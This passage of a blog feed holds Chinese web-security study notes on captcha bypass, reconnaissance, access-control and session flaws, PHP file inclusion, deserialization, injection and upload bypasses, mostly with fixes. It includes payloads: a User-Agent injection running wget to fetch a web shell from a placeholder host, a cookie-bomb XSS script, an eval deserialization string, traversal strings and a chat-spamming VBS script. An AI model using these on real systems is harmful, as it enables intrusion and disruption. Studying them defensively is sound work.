禁止验证码在本地生成。 设置验证码的时效性。 随机生成，一次就失效。 验证码绕过 原理： 通过修改服务端返回的数据包，实现绕过验证码。 方法： 发送验证码后，随便填入一个验证码，提交抓包，burp中按鼠标右键-&gt;Do Intercept-&gt;Response to this request-&gt;点击Forward。就可查看到返回的数据包。如果出现了“code:1”等这样的提示，说明我们提交的验证码是错误的返回了1，那么尝试修改成0，可能就可以成功绕过了。 修复： 服务端进行二次校验验证码。 验证码自动识别 原理： 使用了图形验证码，但不是太复杂，可以用工具自动识别出来，适用于有验证码的爆破。识别流程为： 图像二值化：将图像上像素点的灰度值设置为0或255（即黑白效果）。 去干扰：将图片上的点、线、色彩等去除。 字符分割：从验证码图像中分割出字符区域。 字符识别：吧字符区域上的字符识别出来。 方法： 多处刷新验证码，知道验证码都是由数字和大小写字母组成。 通过PKAV HTTP Fuzzer工具设定验证码包含的字符范围，即将数字和大小写字母输入。 使用第三方识别工具对验证码进行上述原理中的四个步骤处理。得到的验证码经人工验证看是否一致。不断完善识别的准确率。 准确率达到后（如90%以上），使用burp对登录页面进行抓包，将抓到的包数据放到PKAV HTTP Fuzzer的请求包内，设置验证码标志位、用户名和密码标志位。 开始爆破。 修复： 增加图片验证码的背景元素干扰。 字符的字体进行扭曲、粘连。 使用公式进行运算或者逻辑验证（问答题）。 选择和使用者相关的信息来做图像验证码。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web业务-验证码机制测试","slug":"Web业务-验证码机制测试","permalink":"https://ggyggy666.github.io/tags/Web%E4%B8%9A%E5%8A%A1-%E9%AA%8C%E8%AF%81%E7%A0%81%E6%9C%BA%E5%88%B6%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"信息收集","slug":"信息收集","date":"2020-02-22T11:33:58.000Z","updated":"2020-03-01T03:25:42.531Z","comments":true,"path":"2020/02/22/信息收集/","link":"","permalink":"https://ggyggy666.github.io/2020/02/22/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","excerpt":"为了更熟悉信息收集流程以及保存好收集所需要用到的网站，特在此总结一下。","text":"为了更熟悉信息收集流程以及保存好收集所需要用到的网站，特在此总结一下。 信息收集目标 应该再加上一个子域名爆破。 子域名收集 工具：sublist3r、layer子域名挖掘机在线子域名爆破：https://phpinfo.me/domainhttp://dns.aizhan.comGoogle hack语法云悉资产、FOFA whois信息 常用的查询whois信息的网站：http://whois.chinaz.comhttp://www.aizhan.com/https://whois.aliyun.com/whois/domainhttps://www.tianyancha.com/search?key=bilibili.com IP信息 端口收集扫描工具：Nmap、Masscan http://ping.chinaz.com/https://www.17ce.com/ 微步在线：https://x.threatbook.cn/https://sitereport.netcraft.com/https://www.netcraft.com/search/?q=bilibili.com&amp;sort_field=score&amp;sort_direction=deschttps://dns.aizhan.com/http://ping.chinaz.com/ 在线旁站查询https://phpinfo.me/bing.phpwww.webscan.ccwww.5kik.com 目录信息 工具：dirsearch dirbuster Web服务信息 框架信息 指纹识别信息 http://www.yunsee.cn(云悉）http://finger.tidesec.net/（潮汐） 敏感信息 ①parent directory site:www.example.comhttps://www.exploit-db.com/google-hacking-database（谷歌语法）","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"信息收集","slug":"信息收集","permalink":"https://ggyggy666.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"Web业务-业务办理和授权访问模块测试","slug":"Web业务-业务办理和授权访问模块测试","date":"2020-02-21T12:38:00.000Z","updated":"2020-03-01T03:18:02.227Z","comments":true,"path":"2020/02/21/Web业务-业务办理和授权访问模块测试/","link":"","permalink":"https://ggyggy666.github.io/2020/02/21/Web%E4%B8%9A%E5%8A%A1-%E4%B8%9A%E5%8A%A1%E5%8A%9E%E7%90%86%E5%92%8C%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%A8%A1%E5%9D%97%E6%B5%8B%E8%AF%95/","excerpt":"今天又学习了两个模块-业务办理模块和授权访问模块。","text":"今天又学习了两个模块-业务办理模块和授权访问模块。 由于授权访问模块内容少，就合在一块总结了。 业务办理模块订单ID篡改 原理： 用户查看订单时，通过修改订单ID可以查看其它用户生成的订单，造成平行越权。 方法： 查看自己生成的订单详情，抓包，修改订单ID，即可查看。 修复： 校验相应的订单是否与用户的登录身份一致。 手机号码篡改 原理： 用户登录后的权限被忽略，尝试修改手机号，没有验证手机号与登录者的身份是否一致，使得攻击者拥有对其它用户进行某种操作的权限。 方法： 比如挂失手机号。登录后，进行挂失时，抓包，修改手机号，就可以挂失其他人的手机号了。 修复： 通过session判断用户身份，验证用户身份与手机号是否一致。 用户ID篡改 原理： 用户登录后查看自己的个人信息时，没有验证userid等，如果被修改，就可以看到其他用户的原本不可见的个人信息。 方法： 比如修改收货地址。需要两个账号。A用户在自己的个人信息中，点击修改收货地址，抓包，修改userid为B的userid，提交后返回，A用户的收货地址没有被更改。登录B账号，查看收货地址，被成功修改了。 修复： 校验userID与用户的session身份是否一致。 邮箱和用户篡改 原理： 发送邮件时没有验证发送人，可被修改从而达到钓鱼的目的。 方法： 发送邮件时，抓包，将发送人修改为接收者可信的来源，提交发送。 修复： 验证邮箱、发件人和用户的登录身份是否一致。 商品编号篡改 原理： 没有对商品编号和支付金额等进行验证。 方法： 修改商品的金额，实现1分购买等。 先购买价格较高（或者是积分兑换）的东西，提交订单时抓包，记录下它的商品编号，再购买价格较低的东西，提交订单抓包，将它的商品编号替换为高价格的商品编号，发包。 修复： 商品金额不要在客户端传入。检测价格和交易金额是否一致。检测货品和价格是否一致。 竞争条件 原理： 多个线程同时访问时，可能会造成进行了多个相同的操作。 方法： 提交订单时抓包，发送到intrude中，修改一个无关紧要的数字，在payload那里设置number，进行爆破，这样就在短时间内进行多次访问。 比如网站退款时，没来得及处理验证，就收到了多个退款的申请。 比如购买物品时，买10块钱的东西，余额只有10块钱了。并发请求后，很可能来不及检验余额是否充足，从而购买多个物品。 修复： 避免数据脏读（一个事务读取了另一个事务未提交的数据） 授权访问模块非授权访问 原理： 在没有通过验证的情况下，能够直接访问到需要经过验证才能访问到的网站。 方法： 用户登录后，进行某项操作，比如交话费。交费成功后显示一个成功的界面。将这个页面的URL复制，使用另一个浏览器粘贴访问，若能访问到，即为未授权访问。 修复： 对未授权访问页面做session认证，对用户访问的每一个URL进行身份的验证。 越权 原理： 水平越权，权限相同的不同用户可以相互访问。 垂直越权，低权限（普通用户）访问到高权限用户（管理员）。 方法： 水平越权：上面的修改收货地址就是一个平行越权。用户正常访问自己的页面信息，抓包修改身份ID，查看到其它人的信息。可以爆破ID进行遍历。 垂直越权：用户登录后，修改密码时，抓包，将uid=xxx修改为admin，密码任意，就可能修改掉管理员的密码。 修复： 验证身份的唯一性。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web业务-业务办理和授权访问模块测试","slug":"Web业务-业务办理和授权访问模块测试","permalink":"https://ggyggy666.github.io/tags/Web%E4%B8%9A%E5%8A%A1-%E4%B8%9A%E5%8A%A1%E5%8A%9E%E7%90%86%E5%92%8C%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%A8%A1%E5%9D%97%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"Web业务-登录认证模块测试","slug":"Web业务-登录认证模块测试","date":"2020-02-20T12:02:44.000Z","updated":"2020-03-01T03:20:16.849Z","comments":true,"path":"2020/02/20/Web业务-登录认证模块测试/","link":"","permalink":"https://ggyggy666.github.io/2020/02/20/Web%E4%B8%9A%E5%8A%A1-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E6%A8%A1%E5%9D%97%E6%B5%8B%E8%AF%95/","excerpt":"大家好，我已经很多天没更新啦。今天开启了一本新书的旅程，又学了点东西，来此总结一下。","text":"大家好，我已经很多天没更新啦。今天开启了一本新书的旅程，又学了点东西，来此总结一下。 这本书是《Web攻防之业务安全实战指南》，一本圈内有名的书。总结了网站的各个模块可能遇到的各种漏洞问题，还是很不错的。今天看了第四章-登录认证模块测试。 暴力破解 原理： 只有用户名和密码框，可以被暴力猜解。 方法： 使用burp的intrude模块即可。 修复： 增加验证码。 配置登录失败次数限制。 增加手机或邮箱验证码认证。 Session会话固定 原理： 用户登录时，会有一个SessionID记录这次登录信息，用户退出后，SessionID仍未失效。下次登录时，还是这个SessionID。可以自己尝试登录一次后，记录下SessionID的值，退出，再重新登录，查看SessionID是否还是一样的。 方法： 攻击者可以先生成一个SessionID（攻击者自然是自己知道的），可能可以加在URL链接后面，发送构造好的链接去欺骗用户登录。那么用户就使用了这个SessionID登录。攻击者也同样可以登录，抓包，将自己的SessionID改为被骗的用户登录的那个SessionID，就登录到了被骗的用户账号。 修复： 客户端登录时，验证客户端是否提交了浏览器留存的Session认证标识（SessionID），若提交了，服务器应销毁浏览器留存的这个标识，并要求浏览器重新生成。 Session会话注销 原理： 用户退出时，没有销毁浏览器的Session认证属性标识。跟上面那个差不多，只是这个标识也可能不是SessionID。 方法： 用户登录，抓包，发送到burp的repeater中。然后用户再退出。在repeater中点击GO，如果还显示登录后的信息，说明Session会话没有被销毁。 修复： 用户退出时，服务端和客户端都要及时销毁Session认证会话信息。 Session会话超时时间 原理： （其实我感觉这也不能算是一个漏洞吧。）用户登录后，一定时间内没有进行任何操作，就注销登录。 方法： 同样是登录后，抓包，发送到burp的repeater中，然后什么都不做，静等一段较长的时间。之后点击GO，如果还能显示登录在线，那么就有因会话认证时间过长带来的信息泄露的风险。（但其实我想不到能利用的点） 修复： 对每个session认证会话配置生命周期。 Cookie仿冒 原理： 用户身份存储在cookie中，修改cookie中的身份标识，达到仿冒成其它用户的目的。 方法： 登录时，抓包，修改userid等验证用户身份信息的值，再提交，查看身份账号是否被成功修改。 修复： 对用户的敏感信息使用Session会话认证方式，尽量不要放在cookie中。 密文比对认证 原理： 用户输入用户名和密码后，先进行了本地JS的加密，再传送到服务端，与数据库中存储的用户名和密码的加密值进行校对。（加密了不利于明文字典的爆破） 方法： 登录时，输入用户名和密码后，登录抓包，查看它们的值是不是都是被加密过了的。可以查看源代码中的JS脚本加密部分，了解是怎么加密的，例如是经过hash MD5加密的。那么就可以发送到intrude模块中，在payloads的payload Processing中，选择Add-&gt;弹出的框中第一行选择hash,第二行选择MD5-&gt;再进行爆破攻击。这样就会将爆破的字典先加密后再提交。 修复： 将密码加密过程放在服务端进行。攻击者就不知道是否被加密，以及加密方式是什么了。 登录失败信息 原理： 用户登录失败时，会报错。比如：用户名错误、密码错误、用户名/密码错误。 方法： 如果返回“用户名错误或者用户名不存在”，那么可以只去爆破用户名，就知道了哪些用户是存在的。如果是“密码错误”，那么说明这时使用的用户名是正确的（因为会先判断用户名再判断密码），就只需要爆破密码即可。如果是“用户名/密码错误”，那只能两个都爆破了。 修复： 使用一致的报错信息，并且应该不易于攻击者猜测。比如：账号/密码错误，登录失败等模糊信息。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web业务-登录认证模块测试","slug":"Web业务-登录认证模块测试","permalink":"https://ggyggy666.github.io/tags/Web%E4%B8%9A%E5%8A%A1-%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E6%A8%A1%E5%9D%97%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"VBS脚本病毒刷QQ聊天屏","slug":"VBS脚本病毒刷QQ聊天屏","date":"2020-02-14T08:10:45.000Z","updated":"2020-03-01T03:06:16.866Z","comments":true,"path":"2020/02/14/VBS脚本病毒刷QQ聊天屏/","link":"","permalink":"https://ggyggy666.github.io/2020/02/14/VBS%E8%84%9A%E6%9C%AC%E7%97%85%E6%AF%92%E5%88%B7QQ%E8%81%8A%E5%A4%A9%E5%B1%8F/","excerpt":"2.14与我何干？习还是要学的。","text":"2.14与我何干？习还是要学的。 今天看书看到了“病毒入侵与防御”这一章，学会了写一个VBS脚本病毒来刷QQ聊天窗口的屏。（不会VB，纯copy的代码） 步骤 新建一个txt文件，打开。（这样其实会报错的，看后面） 输入以下代码： Set WshShell=WScript.CreateObject(“WScript.Shell”) WshShell.AppActivate “猪” for i=1 to 10 WScript.Sleep 500 WshShell.SendKeys “^v” WshShell.SendKeys “%s” Next 解释一下：首先使用WScript.CreateObject创立一个对象，并把它赋给WshShell。然后就可以用这个对象调用AppActivate方法。这个方法作用是激活对应标题的窗体。换句话说，你得先打开一个QQ聊天窗口，并且代码第二行的双引号里面的内容应该是它的群名（这里演示的是”猪”)：第三行就开始进入一个循环，循环的内容是：延时500毫秒，将剪切板的内容发送出去。Next作用相当于continue，结束一次后进入下一次（我瞎猜的）其实是起到一个计数器的作用，计算循环了多少次，超出设定的条件循环就退出。我这里是循环10次。 保存后，修改文件后缀为.vbs 这样就写好了这个病毒。来实践一下： 操作 打开猪那个QQ聊天窗口。在输入框中先打入“你是猪”，然后将它复制。 直接点开virus.vbs文件,发现报错了。注意：对于群名是中文的，而且是直接在记事本打开编辑的，很可能点击vbs文件后没效果，或者报错。如果是英文名完全OK。 解决办法是在notepad++中新建一个文件，先选择ANSI编码，将代码输入，再保存为.vbs文件，才行。（而不是像开头第一步新建txt文件，在记事本操作）这样操作后，可以看到发送了10次“你是猪”。一个刷屏病毒就完成了。当然，还有更多有趣的小病毒，如：可以点击下方链接查看。整人病毒大全","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"VBS脚本病毒刷QQ聊天屏","slug":"VBS脚本病毒刷QQ聊天屏","permalink":"https://ggyggy666.github.io/tags/VBS%E8%84%9A%E6%9C%AC%E7%97%85%E6%AF%92%E5%88%B7QQ%E8%81%8A%E5%A4%A9%E5%B1%8F/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"命令行的操作","slug":"命令行的操作","date":"2020-02-12T04:52:08.000Z","updated":"2021-03-17T13:36:41.692Z","comments":true,"path":"2020/02/12/命令行的操作/","link":"","permalink":"https://ggyggy666.github.io/2020/02/12/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9A%84%E6%93%8D%E4%BD%9C/","excerpt":"今天学习了命令行的IP、端口、ping、netstat等命令。","text":"今天学习了命令行的IP、端口、ping、netstat等命令。 IP Internet Protocol,32位，一个字节8位，所以有4位。每一位用十进制表示，其范围为：0-255。如：192.168.1.1 IP地址分类（对于第一位）：A（1-126）；B（128-191）；C（192-223）；D（224-239）；E（240-255）； 子网掩码作用： 确定地址中的网络号和主机号； 将大的IP网络划分为若干小网络。 DNS将域名请求转为IP地址。 端口 按端口号分布划分 公认端口：0-1023； 注册端口：1024-49151； 动态和/或私有端口：49152-65535 按协议类型划分TCP端口 FTP（21端口，文件传输协议） Telnet（23端口，远程登录） SMTP（25端口，邮件传输协议） POP3（110端口，邮件接收） UDP端口 HTTP（80端口，超文本传输协议） DNS协议（53端口，域名解析成IP地址） SNMP（161端口，简单网络管理协议） QQ协议（8000端口监听，4000端口发送信息） 服务器常见应用端口 ping命令 ping /?查看使用方法。 -t：不断发送请求到目的地 -a：对IP反向名称解析 -》成功，显示主机名 -n：发送回响请求消息的次数，默认为4. -l size：发送的“数据”字段长度。默认：32字节，最大是65527. 示例查看网卡及TCP/IP是否正常：ping 192.168.1.1不断发包，解析主机名：ping -a -t 192.168.1.1 注意后面的TTL=64。TTL-&gt; Time To Live，数据包在网络的存活时间。可用来判断目标计算机使用的操作系统类型。因为：TTL值： win10与win7: 64 Linux：64或255 Windows NT/2000/XP：128 Windows：98 UNIX: 255 netstat 用于查看网络连接。netstat /?查看使用方法。 -a：显示所有活动的TCP连接及TCP和UDP端口 -e：显示以太网统计信息 -n：显示活动的TCP连接。数字形式表现地址和端口号 -o：显示活动TCP连接和进程ID -p：显示指定的协议的链接 -r：显示路由表的内容 -s：按协议显示统计信息 示例 显示TCP连接和端口：netstat -a 显示活动的TCP/IP连接：netstat -n 或 netstat 显示以太网统计信息和所有协议统计信息：netstat -se 检测路由表情况：netstat -rn net net view显示域列表，计算机列表或指定计算机的共享资源列表。格式：net view [\\computername | dp, aom[omainname]] net user添加或更改用户账号或显示用户账号信息。格式：net user [username[password | *] [options]] [/domain]net user [username[password | *] /add [options][/domain] net use连接计算机或断开计算机与共享资源的连接。略 net start启动服务或显示已启动服务的列表 net stop停止Windows网络服务 net share创建、删除、显示共享资源 23端口的远程登录 telnet 192.168.1.102 80 ftp传输协议 将文件传送到正在运行FTP服务的远程计算机，或从远程计算机下载文件。按 ftp 进入环境。 -v：显示远程服务器的所有响应信息 -n：限制FTP的自动登录 -d：使用调试方式 -g：取消全局文件名 查看网络配置 ipconfigipconfig/all","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"命令行的操作","slug":"命令行的操作","permalink":"https://ggyggy666.github.io/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%9A%84%E6%93%8D%E4%BD%9C/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"读《白帽子讲web安全》的收获(四)","slug":"读《白帽子讲web安全》的收获(四)","date":"2020-02-07T14:45:31.000Z","updated":"2020-03-01T03:16:15.793Z","comments":true,"path":"2020/02/07/读《白帽子讲web安全》的收获(四)/","link":"","permalink":"https://ggyggy666.github.io/2020/02/07/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E5%9B%9B)/","excerpt":"紧接着上次所发的文章","text":"紧接着上次所发的文章 这次带来的是收获（四）。 应用层拒绝服务攻击 TCP三次握手： 客户端向服务端发送一个SYN包，包含客户端使用的端口号和初始序列x; 服务端收到SYN后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认后x+1和服务器端的初始序列y; 客户端收到SYN+ACK报文后，向服务端返回一个确认号为y+1,序号为x+1的ACK报文。 DDOS攻击： 伪造大量的源IP地址，向服务器端发送大量的SYN包。 服务器端返回SYN+ACK包，但是IP是伪造的，没有应答，它就会重试3-5次，并且等待一个SYNTime(30s-2min)。 超时服务器端丢弃这个链接。由于这种请求是大量的，无暇处理正常请求，导致拒绝服务。 资源耗尽攻击（Slowloris攻击） Web Server对于并发的连接数有一定的上限。以极低的速度向服务器发送HTTP请求，就会恶意占用连接，导致服务器无法接受新的请求，从而导致拒绝服务。 正常的HTTP头是以\\r\\n\\r\\n结尾的，比如：Content-Length:42\\r\\n\\r\\n。可以构造不完整的HTTP请求： GET / HTTP/1.1\\r\\n HOST: host\\r\\n User-Agent:Mozilla\\r\\n只有一个\\r\\n,服务端会任务HTTP Headers部分没有结束，就会保持连接不释放。或者可以指定一个非常大的Content-Length的值，然后以一种极低的速度发包。 Server Limit DOS Web Server对HTTP包头都有长度限制。Apache默认最大是8192字节（Request Header)。超过这个限制就会返回错误。 通过xss攻击，往客户端写入一个超长的cookie，那么该客户端在清除cookie之前无法访问该域所在的任何页面。POC如下： &lt;script language=&quot;javascript&quot;&gt; alert(&apos;document.cookie&apos;); var metastr=&quot;AAAAAAAAAA&quot;; //10个A var str=&quot;&quot;;`` while(str.length&lt;4000){ str += metastr; } alert(str.length); document.cookie = &quot;evil13=&quot; + &quot;\\&lt;script\\&gt;alert(xss)\\&lt;\\/script\\&gt;&quot; + &quot;;expires=Thu,18-Apr-2019 08:37:43 GMT;&quot;; document.cookie = &quot;evil1=&quot; + str + &quot;;expires=Thu,18-Apr-2019 08:37:43 GMT;&quot;; document.cookie = &quot;evil2=&quot; + str + &quot;;expires=Thu,18-Apr-2019 08:37:43 GMT;&quot;; alert(document.cookie)正则：ReDos 正则表达式是基于NFA（Nondeterministic Finite Automaton)的。它是一个状态机，对于每个状态和输入符号都可能有许多下一个状态，然后遍历所有状态，不停尝试下一个状态，直到匹配到为止。 比如：^(a+)+$ ,当输入aaaaX时，只有16种状态的尝试，很快可以遍历完。但输入的是：aaaaaaaaaaaaaaaaX,共有65536中可能。大大增加了正则引擎解析的消耗。 PHP安全 文件包含漏洞： 常见的导致文件包含的函数： PHP: include(), include_once(), require(), require_once(), fopen(), readfile()… JSP/Servlet: ava.io.File(), java.io.FileReader()… ASP: include file, include virtual… 本地文件包含：？file = ../../../etc/passwd，绕过姿势： 0字节截断：%00,\\0 长度绕过：如：///////abc, ./././././abc, ../1/abc/../1/abc/../1/abc .(%2e) ==&gt;/(%2f）==&gt; \\(%5c) ==&gt; /(%c0%af) ==&gt; \\(%c1%9c) 本地文件包含后执行PHP代码： 包含用户上传的文件 包含data:// 或 php://input 等伪协议 包含session文件 包含日志文件，比如Web Server 的access logApache:读取httpd的配置文件httpd.conf,找到日志文件所在的目录。httpd.conf一般在Apache的安装目录下，也可能为：/etc/httpd/conf/httpd.conf, 自定义安装的可能在：/usr/local/apache/conf/httpd.conf 包含/proc/self/environ文件?page=../../../../proc/self/environ,在user-Agent中注入：&lt;?php system(&#39;wget http://xxx.com/xxx.txt -O shell.php)&#39;?&gt; 包含上传的临时文件（RFC1867）PHP会为上传文件创建临时文件，目录在php.ini的upload_tmp_dir中定义，Linux下使用/tmp目录，Windows下使用C:\\windows\\temp目录。但文件名随机，可暴力破解。 包含其他应用创建的文件，比如数据库文件，缓存文件，应用日志等。 远程文件包含 allow_url_include = ON 变量覆盖漏洞： 全局变量覆盖 register_globals = ON xxx.php?GLOBALS[a]=1&amp;b=2 extract()变量覆盖 ?auth=1 import_request_variables变量覆盖 ?auth=1 parse_str()变量覆盖 代码执行漏洞： 危险函数：popen(),system(),passthru(),exec(),eval()等 执行代码方式： 直接执行代码：eval,assert,system,exec,shell_exec,passthru,escapeshellcmd,pcntl_exec 文件包含：include,include_once,requier,equire_once 本地文件写入：file_put_contents,fwrite,fputs preg_replace(): 需要\\e 动态函数执行：create_function Curly Syntax：执行花括号间的代码，并将结果替换回去。 回调函数执行：很多，注意ob_start() unserialize()：能将序列化的数据重新映射为PHP变量 执行条件： unserialize()的参数用户可以控制，构造成需要反序列化的数据结构； 存在_destruct()函数或者_wakeup函数。可以通过unserialize()控制_destruct()和_wakeup()函数的输入. &lt;?php class Example { var $var=&apos;&apos;; function _destruct() { eval($this-&gt;var); } } unserialize($_GET[&apos;saved_code&apos;]); ?&gt; 攻击payload： https://xxx.com/xxx.php?saved_code=0:7:&quot;Example&quot;:1:{s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;} 攻击payload可以先模仿目标代码的实现过程，再通过调用serialize()获得。","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"读《白帽子讲web安全》的收获(四)","slug":"读《白帽子讲web安全》的收获-四","permalink":"https://ggyggy666.github.io/tags/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7-%E5%9B%9B/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"读《白帽子讲web安全》的收获(三)","slug":"读《白帽子讲web安全》的收获(三)","date":"2020-02-06T13:34:56.000Z","updated":"2020-03-01T03:16:10.870Z","comments":true,"path":"2020/02/06/读《白帽子讲web安全》的收获(三)/","link":"","permalink":"https://ggyggy666.github.io/2020/02/06/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E4%B8%89)/","excerpt":"紧接着上次所发的文章","text":"紧接着上次所发的文章 这次带来的是收获（二）。 认证与会话管理 认证是为了认出用户是谁，授权决定了用户能做什么。 - 彩虹表 收集明文与明文对应的MD5值 - SessionId 可能在cookie中也可能在URL中，如果是在URL中，可以通过referer泄露出来。例如： 1. 发送到QQ邮箱的邮件中引用了一张外部网站的图片： &lt;img src=&quot;https://xxx.com/xxx.jpg&gt; 2. 打开QQ邮箱查看邮件，会解析图片，这个过程相当于发起来一次GET请求，抓包查看Referer，QQ邮箱的sid就泄露了。 - Session Fixation A将某个SessionID放到URL中，B点击了，B就以这个SessionID登录了。如果SessionID没有被重写，那么A可以修改它自己的SessionID为刚才B登录的那个，就能登录进去B的账号。 访问控制 - 垂直权限与水平权限 - OAuth Jane 想将qq的图片分享到朋友圈。那么他在朋友圈中，选择要从qq中获取图片，朋友圈的后台就会创建一个临时凭证，然后去访问QQ。跳转到QQ后，要求登录（是在QQ中登录），登录成功后，QQ询问Jane是否授权，授权成功，QQ将Jane带来的临时凭证标记为已经授权，再跳转回朋友圈。 加密算法与随机数 - 加密算法 1. 分组加密 分成一些长度不同的组，分别加密。有AES，DES等，为CBC模式 2. 流密码加密 每次只处理一个字节，密钥独立于消息之外，两者通过异或实现。有RC4、ORYX、SEAL等。 3. ECB模式 改变分组密文的顺序，明文顺序也会被改变；替换某个密文，某个明文也会被改变，其它都不变。 如：密文对应的明文为：xxx &amp; pay = 10000 ，将1.0对应的密文替换10000对应的密文，就可以一块钱买东西了。 - 时间不随机 密码是通过获取当前系统的时间得到的，如果是调用microtime（）函数，再去MD5加密后的密文，通过遍历microtime()的值就可破解：获取当前系统时间，以此为基数，依次递增。 web框架安全 - MVC框架 view层：负责用户视图、页面展示等 controller层：接收view层传入的用户请求 model层：实现模型，完成数据的处理","categories":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"读《白帽子讲web安全》的收获(三)","slug":"读《白帽子讲web安全》的收获-三","permalink":"https://ggyggy666.github.io/tags/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7-%E4%B8%89/"}],"keywords":[{"name":"web安全","slug":"web安全","permalink":"https://ggyggy666.github.io/categories/web%E5%AE%89%E5%85%A8/"}]},{"title":"读《白帽子讲web安全》的收获(二)","slug":"读《白帽子讲web安全》的收获(二)","date":"2020-02-01T12:45:51.000Z","updated":"2020-03-01T03:16:05.526Z","comments":true,"path":"2020/02/01/读《白帽子讲web安全》的收获(二)/","link":"","permalink":"https://ggyggy666.github.io/2020/02/01/%E8%AF%BB%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8%E3%80%8B%E7%9A%84%E6%94%B6%E8%8E%B7(%E4%BA%8C)/","excerpt":"紧接着上次所发的文章","text":"紧接着上次所发的文章 这次带来的是收获（二）。 CSRF - P3P头运行跨域访问隐私数据 - 对于POST请求，可以在某一个网站的html页面构造表单，利用js自动提交表单 点击劫持 - 利用iframe的hidden属性隐藏页面，使得用户在不知情下点击 - 利用图片覆盖 - 利用拖拽数据 - 利用Flash（如弄一个小游戏） - 攻击者可能将恶意代码保存在**webstorage**中，实现跨页面攻击 注入 - SOL注入 注册admin（后面55个空格），可以修改管理员密码 - xml注入 &lt;?xml version=&quot;1.0&quot; ?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY % system &quot;&quot;&gt; ]&gt; - 代码注入 1. eval, system等函数 2. ?test=dd 后面直接加;然后加命令，如： `?arg=1;phpinfo()` - CRLF注入 http头没有过滤\\r\\n,导致可以添加HTTP头中的参数，可使用%0d%0a%0d%0a,后面再加payload，如： ?email=%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt; HTTP/1.1 文件上传漏洞 - 使用0字节阶段 如：只允许上传JPG图片，那么可以构造文件名后缀：xxx.php[\\0].JPG - 将正常图片和PHP文件合并 检测图片的文件开头，那么可以将PHP文件合并到图片的尾部 - 利用apache文件解析漏洞 Apache对于文件名的解析是从后往前的，如果仅仅检测是否为rar文件，那么可以将一个PHP文件命名为：xxx.php.rar.rar - 利用IIS文件解析问题 使用;截断，如：abc.asp;xx.jpg 会被检测为 abc.asp。 处理文件拓展名出错：/path/xyz.asp/abc.jpg 会将xyz.asp目录下的所有文件都作为ASP文件解析，比如这个abc.jpg就会被认为是ASP类型的。原因就是因为目录名有.asp。 以上的两个漏洞，都需要文件确实存在，如那个xxx.jpg。如果能够控制更改文件目录的名字就可以改为.asp了。 - PHP CGI路径解析问题 访问.../path/test.jpg/noexisten.php时,会把test.jpg当 做PHP文件执行，而noexisten.php是不存在的。因此如果上传的图片内容是php文件类型的，然后在访问这个图片的URL链接后面加上/xxx.php就可以把它当做PHP执行，从而执行里面的代码。 - 利用上传文件钓鱼 如果是普通的钓鱼可能容易被发现URL的不一致。那么可以在正规网站上传图片，图片内容可以导向钓鱼网站，这样用户就会以为打开的只是一个正常图片。比如： 1. 